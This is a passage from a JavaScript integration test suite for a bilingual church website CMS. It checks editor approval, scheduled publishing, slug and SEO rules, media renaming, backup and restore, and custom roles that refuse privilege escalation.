    // Reject: the change goes, the live record stays.
    const selfRejectRev = await fetch(`${BASE}/admin/announcements/${submitted.id}/revision/reject`, {
      method: "POST",
      headers: asEditor,
    });
    assert.equal(selfRejectRev.status, 403, `editor rejecting → ${selfRejectRev.status}`);
    const rejectedRev = await json(
      await fetch(`${BASE}/admin/announcements/${submitted.id}/revision/reject`, { method: "POST", headers: auth() }),
    );
    assert.equal(rejectedRev.revision, undefined, "rejected change is gone");
    assert.equal(rejectedRev.title.en, liveTitle);

    // Resubmit, then approve: the approver's save applies it and clears it.
    await fetch(`${BASE}/admin/announcements/${submitted.id}`, {
      method: "PATCH",
      headers: asEditor,
      body: JSON.stringify({ title: { en: "Approved change", ta: "அங்கீகரிக்கப்பட்டது" } }),
    });
    const approvedRev = await json(
      await fetch(`${BASE}/admin/announcements/${submitted.id}`, {
        method: "PATCH",
        headers: auth(),
        body: JSON.stringify({ title: { en: "Approved change", ta: "அங்கீகரிக்கப்பட்டது" }, status: "published" }),
      }),
    );
    assert.equal(approvedRev.title.en, "Approved change");
    assert.equal(approvedRev.revision, undefined, "approval clears the waiting change");
    const publicApproved = (await json(await fetch(`${BASE}/announcements`))).find((a) => a.id === submitted.id);
    assert.equal(publicApproved.title.en, "Approved change", "approved change is public");

    // An editor cannot delete a live item (they lack content.delete, and the
    // service refuses regardless - see the custom-role check below).
    const delLive = await fetch(`${BASE}/admin/announcements/${submitted.id}`, {
      method: "DELETE",
      headers: asEditor,
    });
    assert.equal(delLive.status, 403, `editor delete live → ${delLive.status}`);

    // 6. An editor's create with no status starts as a draft, even for a type
    //    whose default is "published" (fellowships use the same rule).
    const noStatus = await json(
      await fetch(`${BASE}/admin/announcements`, {
        method: "POST",
        headers: asEditor,
        body: notice("Draft by default"),
      }),
    );
    assert.equal(noStatus.status, "draft", "editor default status should be draft");

    // 7. Church pages: an editor's save is held for approval (church request,
    //    23 Nov 2026) - the website keeps the live version until an admin
    //    approves (saves) it or rejects it.
    const liveBefore = await json(await fetch(`${BASE}/church/weekly-verse`));
    const psalm = {
      reference: { en: "Psalm 23:1", ta: "சங்கீதம் 23:1" },
      text: { en: "The Lord is my shepherd.", ta: "கர்த்தர் என் மேய்ப்பராயிருக்கிறார்." },
      weekOf: "2026-11-22",
    };
    const verse = await fetch(`${BASE}/admin/church/weekly-verse`, {
      method: "PUT",
      headers: asEditor,
      body: JSON.stringify(psalm),
    });
    assert.equal(verse.status, 200, `editor submit weekly verse → ${verse.status}`);
    assert.equal((await json(verse)).status, "pending", "an editor's save is a submission");
    const stillLive = await json(await fetch(`${BASE}/church/weekly-verse`));
    assert.equal(stillLive.reference.en, liveBefore.reference.en, "the website is unchanged until approval");
    const waiting = await json(await fetch(`${BASE}/admin/church/weekly-verse/pending`, { headers: auth() }));
    assert.equal(waiting.pending.data.reference.en, "Psalm 23:1");
    assert.equal(waiting.pending.submittedBy.name, editorLogin.user.name);

    // The editor cannot reject (or approve) their own submission.
    const selfReject = await fetch(`${BASE}/admin/church/weekly-verse/reject`, {
      method: "POST",
      headers: asEditor,
    });
    assert.equal(selfReject.status, 403, `editor reject → ${selfReject.status}`);

    // Reject: the submission goes, the live verse stays.
    const rejected = await fetch(`${BASE}/admin/church/weekly-verse/reject`, { method: "POST", headers: auth() });
    assert.equal(rejected.status, 204, `admin reject → ${rejected.status}`);
    const none = await json(await fetch(`${BASE}/admin/church/weekly-verse/pending`, { headers: auth() }));
    assert.equal(none.pending, null, "rejected submission is gone");

    // Resubmit and approve: the admin's save publishes it and clears the slot.
    await fetch(`${BASE}/admin/church/weekly-verse`, { method: "PUT", headers: asEditor, body: JSON.stringify(psalm) });
    const verseApproved = await fetch(`${BASE}/admin/church/weekly-verse`, {
      method: "PUT",
      headers: auth(),
      body: JSON.stringify(psalm),
    });
    assert.equal((await json(verseApproved)).status, "published");
    const live = await json(await fetch(`${BASE}/church/weekly-verse`));
    assert.equal(live.reference.en, "Psalm 23:1", "approval puts it live");
    const cleared = await json(await fetch(`${BASE}/admin/church/weekly-verse/pending`, { headers: auth() }));
    assert.equal(cleared.pending, null, "approval clears the submission");

    // 7b. Pinning unpins the live pinned notice, so editors cannot pin.
    const pinAttempt = await fetch(`${BASE}/admin/announcements`, {
      method: "POST",
      headers: asEditor,
      body: JSON.stringify({ ...JSON.parse(notice("Pinned draft")), pinned: true }),
    });
    assert.equal(pinAttempt.status, 403, `editor create pinned → ${pinAttempt.status}`);

    // 8. An admin can still create and publish in one step.
    const adminDirect = await json(
      await fetch(`${BASE}/admin/announcements`, {
        method: "POST",
        headers: auth(),
        body: notice("Admin publishes directly", "published"),
      }),
    );
    assert.equal(adminDirect.status, "published", "admin should publish directly");
  });

  await check("PATCH null removes an optional field instead of ignoring it", async () => {
    const created = await json(
      await fetch(`${BASE}/admin/blog`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({
          title: { en: "Clearing test", ta: "…" },
          excerpt: { en: "Has a cover to begin with.", ta: "…" },
          body: [{ en: "One paragraph.", ta: "…" }],
          publishedAt: "2026-08-01",
          author: { en: "Church Office", ta: "…" },
          coverImage: {
            url: `http://127.0.0.1:${PORT}/uploads/images/cover.jpg`,
            alt: { en: "A cover", ta: "…" },
            width: 1200,
            height: 800,
          },
          fellowshipSlug: "choir",
        }),
      }),
    );
    assert(created.coverImage?.url, "the post should start with a cover image");
    assert.equal(created.fellowshipSlug, "choir");

    /*
     * Omitting a key means "leave it alone", so removal has to be said out
     * loud. Before this, the CMS omitted the key and a cleared cover image
     * saved successfully without changing anything.
     */
    const patched = await json(
      await fetch(`${BASE}/admin/blog/${created.id}`, {
        method: "PATCH",
        headers: auth(),
        body: JSON.stringify({ coverImage: null, fellowshipSlug: null }),
      }),
    );
    assert.equal(patched.coverImage, undefined, "coverImage must be gone, not null");
    assert.equal(patched.fellowshipSlug, undefined, "fellowshipSlug must be gone");

    // …and stay gone once re-read, rather than only looking gone in the reply.
    const reread = await json(
      await fetch(`${BASE}/admin/blog/${created.id}`, { headers: auth() }),
    );
    assert.equal(reread.coverImage, undefined, "coverImage came back on re-read");

    // An omitted key must still mean "leave alone" - the other half of the
    // contract, and the half everything else in the CMS relies on.
    const untouched = await json(
      await fetch(`${BASE}/admin/blog/${created.id}`, {
        method: "PATCH",
        headers: auth(),
        body: JSON.stringify({ excerpt: { en: "Edited.", ta: "…" } }),
      }),
    );
    assert.equal(untouched.title.en, "Clearing test", "an omitted title must survive");
    assert.equal(untouched.excerpt.en, "Edited.");

    await fetch(`${BASE}/admin/blog/${created.id}`, { method: "DELETE", headers: auth() });
  });

  await check("Contact inbox searches sender, subject and body", async () => {
    await fetch(`${BASE}/contact`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name: "Anbu Selvam",
        email: "anbu@example.org",
        subject: "Baptism enquiry",
        message: "We would like to ask about arranging a baptism.",
      }),
    });

    const bySender = await json(
      await fetch(`${BASE}/admin/contact-messages?search=anbu`, { headers: auth() }),
    );
    assert.equal(bySender.total, 1, "search must match the sender's name");

    // The body is searched too - people hunt for a half-remembered phrase.
    const byBody = await json(
      await fetch(`${BASE}/admin/contact-messages?search=arranging`, { headers: auth() }),
    );
    assert.equal(byBody.total, 1, "search must reach into the message body");

    /*
     * A regex metacharacter must be treated as text. Unescaped, `(` is a
     * syntax error the driver raises - a 500 from typing a bracket into a
     * search box.
     */
    const res = await fetch(`${BASE}/admin/contact-messages?search=${encodeURIComponent("a(b")}`, {
      headers: auth(),
    });
    assert.equal(res.status, 200, `metacharacter search → ${res.status}`);
    assert.equal((await json(res)).total, 0, "a literal 'a(b' matches nothing");
  });

  console.log("\nPublish schedule (F-049):");

  const HOUR = 3600 * 1000;
  const future = () => new Date(Date.now() + 48 * HOUR).toISOString();
  const past = () => new Date(Date.now() - 48 * HOUR).toISOString();
  const post = async (path, body) => {
    const res = await fetch(`${BASE}${path}`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify(body),
    });
    return { status: res.status, body: await json(res) };
  };
  const patch = async (path, body) => {
    const res = await fetch(`${BASE}${path}`, {
      method: "PATCH",
      headers: auth(),
      body: JSON.stringify(body),
    });
    return { status: res.status, body: await json(res) };
  };
  const publicSlugsOf = async (path) =>
    (await json(await fetch(`${BASE}${path}`))).map((item) => item.slug);

  await check("announcement: future publishAt hidden, expired hidden, admin sees both", async () => {
    const scheduled = await post("/admin/announcements", {
      title: { en: "Advent Retreat Registration", ta: "திருவருகை தியானம் பதிவு" },
      body: { en: "Registration opens soon.", ta: "பதிவு விரைவில்." },
      publishedAt: "2026-11-20",
      status: "published",
      publishAt: future(),
    });
    assert.equal(scheduled.status, 201, JSON.stringify(scheduled.body));
    assert(scheduled.body.publishAt, "admin response carries publishAt");

    const expired = await post("/admin/announcements", {
      title: { en: "July Parish Picnic", ta: "ஜூலை பங்கு சுற்றுலா" },
      body: { en: "Buses leave at 7.", ta: "பேருந்து 7 மணிக்கு." },
      publishedAt: "2026-07-01",
      status: "published",
      expiresAt: past(),
    });
    assert.equal(expired.status, 201, JSON.stringify(expired.body));

    const live = await post("/admin/announcements", {
      title: { en: "Carol Practice Times", ta: "கீர்த்தனை பயிற்சி நேரம்" },
      body: { en: "Every Friday.", ta: "ஒவ்வொரு வெள்ளி." },
      publishedAt: "2026-11-21",
      status: "published",
      publishAt: past(),
      expiresAt: future(),
    });
    assert.equal(live.status, 201, JSON.stringify(live.body));

    const list = await json(await fetch(`${BASE}/announcements`));
    const slugs = list.map((a) => a.slug);
    assert(!slugs.includes(scheduled.body.slug), "scheduled announcement leaked early");
    assert(!slugs.includes(expired.body.slug), "expired announcement still public");
    assert(slugs.includes(live.body.slug), "in-window announcement missing");
    for (const item of list) {
      for (const key of ["status", "publishAt", "expiresAt"]) {
        assert.equal(item[key], undefined, `public announcement exposes ${key}`);
      }
    }

    const admin = await json(
      await fetch(`${BASE}/admin/announcements?pageSize=100`, { headers: auth() }),
    );
    const adminSlugs = admin.items.map((a) => a.slug);
    assert(adminSlugs.includes(scheduled.body.slug) && adminSlugs.includes(expired.body.slug),
      "admin must still see scheduled and expired records");

    // Clearing the expiry (null) brings it back.
    const cleared = await patch(`/admin/announcements/${expired.body.id}`, { expiresAt: null });
    assert.equal(cleared.status, 200, JSON.stringify(cleared.body));
    assert.equal(cleared.body.expiresAt, undefined, "null must remove expiresAt");
    assert((await publicSlugsOf("/announcements")).includes(expired.body.slug),
      "clearing expiresAt should make it public again");
  });

  await check("a pinned announcement that is scheduled or expired is not /pinned", async () => {
    const pinned = await post("/admin/announcements", {
      title: { en: "Harvest Thanksgiving Notice", ta: "அறுவடை நன்றி அறிவிப்பு" },
      body: { en: "Bring your offerings.", ta: "காணிக்கை கொண்டு வரவும்." },
      publishedAt: "2026-11-01",
      status: "published",
      pinned: true,
      expiresAt: past(),
    });
    assert.equal(pinned.status, 201, JSON.stringify(pinned.body));
    const body = await json(await fetch(`${BASE}/announcements/pinned`));
    assert(body === null || body.slug !== pinned.body.slug, "expired pinned leaked");
  });

  await check("expiresAt before publishAt is refused", async () => {
    const res = await post("/admin/announcements", {
      title: { en: "Backwards Window", ta: "தலைகீழ்" },
      body: { en: "x", ta: "x" },
      publishedAt: "2026-11-01",
      publishAt: future(),
      expiresAt: past(),
    });
    assert.equal(res.status, 400);
  });

  await check("blog, events and gallery honour publishAt on every public read", async () => {
    const image = {
      url: `${BASE.replace("/v1", "")}/uploads/images/x.jpg`,
      alt: { en: "Poster", ta: "போஸ்டர்" },
      width: 1600,
      height: 900,
    };
    const blog = await post("/admin/blog", {
      title: { en: "Advent Week One Reflection", ta: "திருவருகை முதல் வாரம்" },
      excerpt: { en: "Hope.", ta: "நம்பிக்கை." },
      body: [{ en: "Paragraph.", ta: "பத்தி." }],
      publishedAt: "2026-11-29",
      author: { en: "Church Office", ta: "அலுவலகம்" },
      status: "published",
      publishAt: future(),
    });
    assert.equal(blog.status, 201, JSON.stringify(blog.body));
    const event = await post("/admin/events", {
      title: { en: "Christmas Eve Service", ta: "கிறிஸ்துமஸ் முன்தின ஆராதனை" },
      summary: { en: "Candlelight.", ta: "மெழுகுவர்த்தி." },
      description: [{ en: "Para", ta: "பத்தி" }],
      startDate: "2026-12-24T13:30:00.000Z",
      location: { en: "Church", ta: "ஆலயம்" },
      status: "published",
      publishAt: future(),
    });
    assert.equal(event.status, 201, JSON.stringify(event.body));
    const album = await post("/admin/gallery", {
      title: { en: "Advent Wreath Lighting", ta: "திருவருகை மாலை" },
      date: "2026-11-29",
      cover: image,
      status: "published",
      publishAt: future(),
    });
    assert.equal(album.status, 201, JSON.stringify(album.body));

    const blogSlugs = await json(await fetch(`${BASE}/blog/slugs`));
    assert(!blogSlugs.includes(blog.body.slug), "/blog/slugs leaked a scheduled post");
    assert(!(await publicSlugsOf("/blog")).includes(blog.body.slug), "/blog leaked");
    assert.equal((await fetch(`${BASE}/blog/${blog.body.slug}`)).status, 404);

    const eventSlugs = await json(await fetch(`${BASE}/events/slugs`));
    assert(!eventSlugs.includes(event.body.slug), "/events/slugs leaked");
    assert(!(await publicSlugsOf("/events?status=upcoming")).includes(event.body.slug),
      "upcoming events leaked a scheduled event");
    assert.equal((await fetch(`${BASE}/events/${event.body.slug}`)).status, 404);

    const gallerySlugs = await json(await fetch(`${BASE}/gallery/slugs`));
    assert(!gallerySlugs.includes(album.body.slug), "/gallery/slugs leaked");
    assert.equal((await fetch(`${BASE}/gallery/${album.body.slug}`)).status, 404);

    // Moving publishAt into the past publishes it, with no other change.
    const now = await patch(`/admin/blog/${blog.body.id}`, { publishAt: past() });
    assert.equal(now.status, 200, JSON.stringify(now.body));
    const shown = await json(await fetch(`${BASE}/blog/${blog.body.slug}`));
    assert.equal(shown.slug, blog.body.slug);
    assert.equal(shown.publishAt, undefined, "public blog post exposes publishAt");
  });

  console.log("\nPlaceholder content (F-003):");

  await check("placeholder titles cannot be published, drafts may keep them", async () => {
    const base = {
      body: { en: "Body", ta: "உடல்" },
      publishedAt: "2026-11-20",
    };
    for (const title of [
      { en: "Sample", ta: "மாதிரி" },
      { en: "Choir notice", ta: "மாதிரி அறிவிப்பு" },
      { en: "DEMO - replace with the carol video", ta: "கீர்த்தனை" },
      { en: "Lorem ipsum", ta: "x" },
      { en: "test", ta: "x" },
    ]) {
      const res = await post("/admin/announcements", { ...base, title, status: "published" });
      assert.equal(res.status, 400, `${title.en} was published: ${JSON.stringify(res.body)}`);
      assert(/placeholder/i.test(JSON.stringify(res.body)), "error must say why");
    }

    // Whole words only: these are real notices.
    const fine = await post("/admin/announcements", {
      ...base,
      title: { en: "Testimony Sunday and Youth Contest", ta: "சாட்சி ஞாயிறு" },
      status: "published",
    });
    assert.equal(fine.status, 201, JSON.stringify(fine.body));

    // A draft may hold placeholder text…
    const draft = await post("/admin/announcements", {
      ...base,
      title: { en: "Sample", ta: "மாதிரி" },
    });
    assert.equal(draft.status, 201, JSON.stringify(draft.body));
    // …but cannot be published through either route until it is fixed.
    assert.equal(
      (await patch(`/admin/announcements/${draft.body.id}/status`, { status: "published" })).status,
      400,
    );
    assert.equal(
      (await patch(`/admin/announcements/${draft.body.id}`, { status: "published" })).status,
      400,
    );
    const renamed = await patch(`/admin/announcements/${draft.body.id}`, {
      title: { en: "Women's Fellowship Retreat", ta: "மகளிர் ஐக்கிய தியானம்" },
      slug: "womens-fellowship-retreat",
      status: "published",
    });
    assert.equal(renamed.status, 200, JSON.stringify(renamed.body));
  });

  await check("a published album refuses a DEMO caption", async () => {
    const image = {
      url: `${BASE.replace("/v1", "")}/uploads/images/x.jpg`,
      alt: { en: "Poster", ta: "போஸ்டர்" },
      width: 1600,
      height: 900,
    };
    const album = await post("/admin/gallery", {
      title: { en: "Carol Service", ta: "கீர்த்தனை ஆராதனை" },
      date: "2026-12-20",
      cover: image,
      status: "published",
    });
    assert.equal(album.status, 201, JSON.stringify(album.body));
    const res = await post(`/admin/gallery/${album.body.id}/photos`, {
      photos: [
        {
          image,
          caption: { en: "DEMO - replace with the carol service recording" },
          video: { url: "https://youtu.be/dQw4w9WgXcQ" },
        },
      ],
    });
    assert.equal(res.status, 400, JSON.stringify(res.body));
  });

  console.log("\nEvent slug year (F-005):");

  await check("an event whose slug year differs from its start date is refused", async () => {
    const base = {
      summary: { en: "Summary", ta: "சுருக்கம்" },
      description: [{ en: "Para", ta: "பத்தி" }],
      location: { en: "Hall", ta: "மண்டபம்" },
    };
    const wrong = await post("/admin/events", {
      ...base,
      title: { en: "Womens Fellowship Day 2026", ta: "மகளிர் ஐக்கிய தினம் 2026" },
      startDate: "2027-10-11T04:30:00.000Z",
    });
    assert.equal(wrong.status, 400, JSON.stringify(wrong.body));
    assert(/2026/.test(wrong.body.message) && /2027/.test(wrong.body.message), "message names both years");

    // 31 Dec 2026 19:00 UTC is already 1 Jan 2027 in India.
    const edge = await post("/admin/events", {
      ...base,
      title: { en: "Watch Night 2027", ta: "இரவு ஜெபம் 2027" },
      startDate: "2026-12-31T19:00:00.000Z",
    });
    assert.equal(edge.status, 201, JSON.stringify(edge.body));

    const right = await post("/admin/events", {
      ...base,
      title: { en: "Womens Fellowship Day 2026", ta: "மகளிர் ஐக்கிய தினம் 2026" },
      startDate: "2026-10-11T04:30:00.000Z",
    });
    assert.equal(right.status, 201, JSON.stringify(right.body));
    assert.equal(right.body.slug, "womens-fellowship-day-2026");

    // Typing a slug whose year disagrees with the date is still refused.
    const typedWrong = await patch(`/admin/events/${right.body.id}`, {
      slug: "womens-fellowship-day-2025",
    });
    assert.equal(typedWrong.status, 400, JSON.stringify(typedWrong.body));
  });

  await check("moving a published event to another year moves its slug and keeps the old URL", async () => {
    const created = await post("/admin/events", {
      title: { en: "Harvest Thanksgiving 2026", ta: "அறுவடை நன்றி 2026" },
      summary: { en: "Summary", ta: "சுருக்கம்" },
      description: [{ en: "Para", ta: "பத்தி" }],
      location: { en: "Hall", ta: "மண்டபம்" },
      startDate: "2026-10-11T04:30:00.000Z",
      status: "published",
    });
    assert.equal(created.status, 201, JSON.stringify(created.body));
    assert.equal(created.body.slug, "harvest-thanksgiving-2026");

    const moved = await patch(`/admin/events/${created.body.id}`, {
      startDate: "2027-10-11T04:30:00.000Z",
    });
    assert.equal(moved.status, 200, JSON.stringify(moved.body));
    assert.equal(moved.body.slug, "harvest-thanksgiving-2027");

    const current = await fetch(`${BASE}/events/harvest-thanksgiving-2027`);
    assert.equal(current.status, 200);
    const old = await json(await fetch(`${BASE}/events/harvest-thanksgiving-2026`));
    assert.equal(old.slug, "harvest-thanksgiving-2027", "the old URL resolves to the moved event");
    assert(!("previousSlugs" in old), "aliases stay admin-side");
  });

  console.log("\nSlugs & SEO:");

  await check("a typed slug is used on create, and SEO metadata reaches the public API", async () => {
    const created = await post("/admin/events", {
      title: { en: "Carol Service", ta: "கீத ஆராதனை" },
      summary: { en: "Summary", ta: "சுருக்கம்" },
      description: [{ en: "Para", ta: "பத்தி" }],
      location: { en: "Hall", ta: "மண்டபம்" },
      startDate: "2026-12-20T13:00:00.000Z",
      status: "published",
      slug: "Christmas Carols at St Mark's",
      seo: {
        title: { en: "Christmas Carol Service | CSI St Mark's" },
        description: { en: "Join us for carols by candlelight.", ta: "" },
        keywords: [" Christmas ", "christmas", "Carol   Service", ""],
      },
    });
    assert.equal(created.status, 201, JSON.stringify(created.body));
    assert.equal(created.body.slug, "christmas-carols-at-st-marks");
    assert.deepEqual(created.body.seo.keywords, ["christmas", "carol service"]);

    const pub = await json(await fetch(`${BASE}/events/christmas-carols-at-st-marks`));
    assert.equal(pub.seo.title.en, "Christmas Carol Service | CSI St Mark's");
    assert.deepEqual(pub.seo.keywords, ["christmas", "carol service"]);

    const media = await patch(`/admin/events/${created.body.id}`, {
      seo: {
        ...pub.seo,
        image: {
          url: "https://example.org/share.jpg",
          alt: { en: "Carols", ta: "" },
          width: 1200,
          height: 630,
        },
        video: { url: "https://youtu.be/dQw4w9WgXcQ" },
      },
    });
    assert.equal(media.status, 200, JSON.stringify(media.body));
    const withMedia = await json(await fetch(`${BASE}/events/christmas-carols-at-st-marks`));
    assert.equal(withMedia.seo.image.url, "https://example.org/share.jpg");
    assert.deepEqual(withMedia.seo.video, { url: "https://youtu.be/dQw4w9WgXcQ", provider: "youtube" });

    const badVideo = await patch(`/admin/events/${created.body.id}`, {
      seo: { video: { url: "https://www.youtube.com/watch?nothing=here" } },
    });
    assert.equal(badVideo.status, 400, "a YouTube link with no video id is refused");

    const tooMany = await patch(`/admin/events/${created.body.id}`, {
      seo: { keywords: Array.from({ length: 21 }, (_, i) => `k${i}`) },
    });
    assert.equal(tooMany.status, 400, "more than 20 keywords is refused");

    const cleared = await patch(`/admin/events/${created.body.id}`, { seo: null });
    assert.equal(cleared.status, 200, JSON.stringify(cleared.body));
    assert(!cleared.body.seo, "null clears the SEO block");
  });

  await check("id-named uploads get readable names; references and old links follow", async () => {
    // Uploaded the old way: a camera name, no alt text, no hint - an id-only name.
    const form = new FormData();
    form.append("file", new Blob([await sharpPixel()], { type: "image/png" }), "IMG_2041.png");
    const uploaded = await json(
      await fetch(`${BASE}/admin/media`, {
        method: "POST",
        headers: { Authorization: `Bearer ${tokens.accessToken}` },
        body: form,
      }),
    );
    const oldPath = uploaded.url.split("/uploads/")[1];
    assert(/^images\/[0-9a-f-]{36}\.png$/.test(oldPath), `id-only name: ${oldPath}`);

    const album = await post("/admin/gallery", {
      title: { en: "Harvest Festival 2026", ta: "அறுவடை விழா 2026" },
      date: "2026-09-20",
      cover: { url: uploaded.url, alt: { en: "", ta: "" }, width: 1, height: 1 },
      status: "published",
    });
    assert.equal(album.status, 201, JSON.stringify(album.body));

    const preview = await json(
      await fetch(`${BASE}/admin/media/seo-names/preview`, { headers: auth() }),
    );
    const planned = preview.find((item) => item.from === oldPath);
    assert(planned, "the id-named file is in the preview");
    assert(
      /^images\/harvest-festival-2026(?:-\d+)?\.png$/.test(planned.to),
      `named from the album that shows it: ${planned.to}`,
    );

    const applied = await json(
      await fetch(`${BASE}/admin/media/seo-names/apply`, { method: "POST", headers: auth() }),
    );
    assert(applied.renamed >= 1 && applied.recordsUpdated >= 1, JSON.stringify(applied));

    const after = await json(await fetch(`${BASE}/admin/gallery/${album.body.id}`, { headers: auth() }));
    assert(after.cover.url.endsWith(planned.to), `album cover follows: ${after.cover.url}`);
    assert.equal((await fetch(after.cover.url)).status, 200, "new name is served");

    const old = await fetch(`${BASE.replace(/\/v1$/, "")}/uploads/${oldPath}`, { redirect: "manual" });
    assert.equal(old.status, 301, "old link redirects");
    assert(old.headers.get("location").endsWith(`/uploads/${planned.to}`), old.headers.get("location"));
  });

  /*
   * Backup and restore is the one place in the CMS where a mistake destroys
   * data, so it is exercised end to end rather than endpoint by endpoint: take
   * a real archive, change the database, restore, and assert the change is
   * gone. Anything less would pass on a restore that quietly writes nothing.
   *
   * Runs last because a `replace` restore rolls the whole database - including
   * `users` - back to the moment the archive was taken, which would pull the
   * ground out from under every check above it.
   */
  console.log("\nBackup & restore:");

  let ticket;
  let archive;

  await check("GET /admin/backup/preview counts the whole installation", async () => {
    const body = await json(await fetch(`${BASE}/admin/backup/preview`, { headers: auth() }));
    assert(body.collections.events >= 1, "expected the events collection");
    assert(body.collections.users >= 1, "expected the users collection");
    assert(body.documents > 0, "expected a document total");
    assert.equal(typeof body.estimatedSize, "string");
  });

  await check("POST /admin/backup archives every collection and the media", async () => {
    const res = await fetch(`${BASE}/admin/backup`, { method: "POST", headers: auth() });
    assert.equal(res.status, 201, `expected 201, got ${res.status}`);
    ticket = await json(res);
    assert.equal(ticket.manifest.format, "csistmc-portal-backup");
    assert(ticket.manifest.collections.events >= 1, "events must be in the manifest");
    assert(ticket.manifest.collections.users >= 1, "users must be in the manifest");
    assert(ticket.manifest.uploads.files >= 1, "the uploaded video must be carried");
    assert(ticket.sizeBytes > 0 && ticket.size, "expected a sized archive");
  });

  await check("the archive downloads on its token, and only on its token", async () => {
    // Unauthenticated on purpose - a browser download cannot send a Bearer
    // header. The token in the path is what stands in for it.
    const res = await fetch(`${BASE}${ticket.downloadPath}`);
    assert.equal(res.status, 200, `expected 200, got ${res.status}`);
    assert.equal(res.headers.get("content-type"), "application/zip");
    archive = Buffer.from(await res.arrayBuffer());
    assert.equal(archive.length, ticket.sizeBytes, "Content-Length must match the archive");
    assert.equal(archive.subarray(0, 2).toString(), "PK", "expected a zip");

    const wrong = await fetch(`${BASE}/admin/backup/${ticket.id}/download?token=not-the-token`);
    assert.equal(wrong.status, 404, `wrong token → ${wrong.status}`);
  });

  // A record that exists *after* the archive was taken. A working `replace`
  // restore must remove it; a restore that silently no-ops would leave it.
  let markerId;
  await check("staging an upload reports the manifest and writes nothing", async () => {
    const created = await json(
      await fetch(`${BASE}/admin/announcements`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({
          title: { en: "Written after the backup", ta: "காப்புப்பிரதிக்குப் பிறகு" },
          body: { en: "Should not survive a replace restore.", ta: "…" },
          publishedAt: "2026-08-08",
        }),
      }),
    );
    markerId = created.id;
    assert(markerId, "expected the marker announcement to be created");

    const form = new FormData();
    form.append("file", new Blob([archive], { type: "application/zip" }), "backup.zip");
    const res = await fetch(`${BASE}/admin/backup/restore`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 200, `expected 200, got ${res.status}`);
    const staged = await json(res);
    assert(staged.id, "expected a staging id");
    assert.equal(staged.manifest.capturedAt, ticket.manifest.capturedAt);
    assert(
      staged.warnings.some((w) => w.includes("Admin accounts")),
      "restoring users must be called out in the warnings",
    );

    // Nothing applied yet.
    const still = await fetch(`${BASE}/admin/announcements/${markerId}`, { headers: auth() });
    assert.equal(still.status, 200, "staging must not touch the database");
    ticket.stagedId = staged.id;
  });

  await check("a replace restore rolls the database back to the archive", async () => {
    const res = await fetch(`${BASE}/admin/backup/restore/${ticket.stagedId}`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ mode: "replace", safetyBackup: true }),
    });
    assert.equal(res.status, 200, `expected 200, got ${res.status}`);
    const result = await json(res);
    assert.equal(result.mode, "replace");
    assert(result.documents > 0, "expected documents restored");
    assert.equal(result.usersReplaced, true, "the users collection was in the archive");
    assert(result.safetyBackup?.downloadPath, "a safety backup must be offered back");

    const gone = await fetch(`${BASE}/admin/announcements/${markerId}`, { headers: auth() });
    assert.equal(gone.status, 404, `marker survived the restore → ${gone.status}`);

    // …and the content that was in the archive is back, addressable as before:
    // `_id` is preserved, so the seeded event keeps its slug and its links.
    const events = await json(await fetch(`${BASE}/events`));
    assert(events.length >= 1, "restored events must be served again");

    // The safety backup's link still works even though `users` was rewritten -
    // its token is not tied to the session that asked for it.
    const rollback = await fetch(`${BASE}${result.safetyBackup.downloadPath}`);
    assert.equal(rollback.status, 200, `safety backup unreachable → ${rollback.status}`);
  });

  await check("restore refuses a file that is not a Portal backup", async () => {
    const form = new FormData();
    form.append("file", new Blob([Buffer.from("not a zip")], { type: "application/zip" }), "x.zip");
    const res = await fetch(`${BASE}/admin/backup/restore`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 400, `expected 400, got ${res.status}`);
  });

  /*
   * Custom roles (church request, 23 Nov 2026): admins define roles with
   * exactly the access they choose, and nobody can define or hand out more
   * access than they hold.
   */
  await check("Custom roles: create, assign, enforce, no escalation", async () => {
    const login = async (email) =>
      json(
        await fetch(`${BASE}/auth/login`, {
          method: "POST",
          // A sign-in bucket of its own, so these don't starve later checks.
          headers: { "Content-Type": "application/json", "X-Forwarded-For": "203.0.113.42" },
          body: JSON.stringify({ email, password: "Password@123" }),
        }),
      );
    const as = (token) => ({ Authorization: `Bearer ${token}`, "Content-Type": "application/json" });

    // An admin manages roles.
    await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        name: "Role Admin",
        email: "roleadmin@example.org",
        password: "Password@123",
        role: "admin",
      }),
    });
    const admin = await login("roleadmin@example.org");

    // ...but cannot create a role holding access admins lack.
    const escalate = await fetch(`${BASE}/admin/roles`, {
      method: "POST",
      headers: as(admin.accessToken),
      body: JSON.stringify({ name: "Sneaky", permissions: ["content.read", "backup.read"] }),
    });
    assert.equal(escalate.status, 403, `admin role with backup.read → ${escalate.status}`);

    const created = await fetch(`${BASE}/admin/roles`, {
      method: "POST",
      headers: as(admin.accessToken),
      body: JSON.stringify({
        name: "Inbox Reader",
        description: "Answers the contact form",
        permissions: ["content.read", "contact.read"],
      }),
    });
    assert.equal(created.status, 201, `create role → ${created.status}`);
    const role = await json(created);
    assert.equal(role.key, "inbox-reader");

    const builtInName = await fetch(`${BASE}/admin/roles`, {
      method: "POST",
      headers: as(admin.accessToken),
      body: JSON.stringify({ name: "Editor", permissions: ["content.read"] }),
    });
    assert.equal(builtInName.status, 409, `duplicate built-in name → ${builtInName.status}`);

    // Assign it (user management is super-admin territory).
    const assigned = await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        name: "Inbox Person",
        email: "inbox@example.org",
        password: "Password@123",
        role: role.key,
      }),
    });
    assert.equal(assigned.status, 201, `assign custom role → ${assigned.status}`);
    const bogus = await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        name: "Nobody",
        email: "nobody@example.org",
        password: "Password@123",
        role: "no-such-role",
      }),
    });
    assert.equal(bogus.status, 400, `unknown role → ${bogus.status}`);

    const person = await login("inbox@example.org");
    assert.deepEqual(person.user.permissions, ["content.read", "contact.read"]);
    assert.equal(person.user.roleName, "Inbox Reader");
    const inbox = await fetch(`${BASE}/admin/contact-messages`, { headers: as(person.accessToken) });
